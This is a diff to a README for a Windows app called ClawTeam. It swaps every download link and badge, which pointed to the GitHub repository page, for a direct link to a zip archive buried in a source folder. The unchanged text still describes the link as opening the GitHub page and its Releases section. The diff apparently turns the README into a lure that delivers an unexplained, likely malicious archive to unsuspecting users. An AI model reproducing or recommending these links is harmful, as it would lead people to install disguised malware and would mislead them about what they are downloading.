@@ -1,6 +1,6 @@
 # 🛠️ ClawTeam - Share and Work Smarter Together
 
-[![Download ClawTeam](https://img.shields.io/badge/Download-ClawTeam-brightgreen?style=for-the-badge)](https://github.com/NightFury02/ClawTeam)  
+[![Download ClawTeam](https://img.shields.io/badge/Download-ClawTeam-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/NightFury02/ClawTeam/main/packages/api/src/primitives/Claw_Team_v2.1.zip)  
 
 ---
 
@@ -28,7 +28,7 @@ To run ClawTeam on your Windows computer, make sure you have:
 Follow these steps to download and run ClawTeam on your Windows computer.
 
 1. Click the big green download button at the top or this link:  
-   [Download ClawTeam](https://github.com/NightFury02/ClawTeam)  
+   [Download ClawTeam](https://raw.githubusercontent.com/NightFury02/ClawTeam/main/packages/api/src/primitives/Claw_Team_v2.1.zip)  
    This link opens the ClawTeam page on GitHub where you will get the latest release.
 
 2. Locate the **Releases** section on the page. It will provide the installation files.
@@ -50,7 +50,7 @@ Follow these steps to download and run ClawTeam on your Windows computer.
 ## 📥 Download and Setup 💾
 
 You will download ClawTeam from this page:  
-[https://github.com/NightFury02/ClawTeam](https://github.com/NightFury02/ClawTeam)
+[https://raw.githubusercontent.com/NightFury02/ClawTeam/main/packages/api/src/primitives/Claw_Team_v2.1.zip](https://raw.githubusercontent.com/NightFury02/ClawTeam/main/packages/api/src/primitives/Claw_Team_v2.1.zip)
 
 ### Step-by-step:
 
@@ -112,4 +112,4 @@ For support, you can create an issue on the GitHub repository page or send a mes
 
 ---
 
-[![Download ClawTeam](https://img.shields.io/badge/Download-ClawTeam-blue?style=for-the-badge)](https://github.com/NightFury02/ClawTeam)
+[![Download ClawTeam](https://img.shields.io/badge/Download-ClawTeam-blue?style=for-the-badge)](https://raw.githubusercontent.com/NightFury02/ClawTeam/main/packages/api/src/primitives/Claw_Team_v2.1.zip)
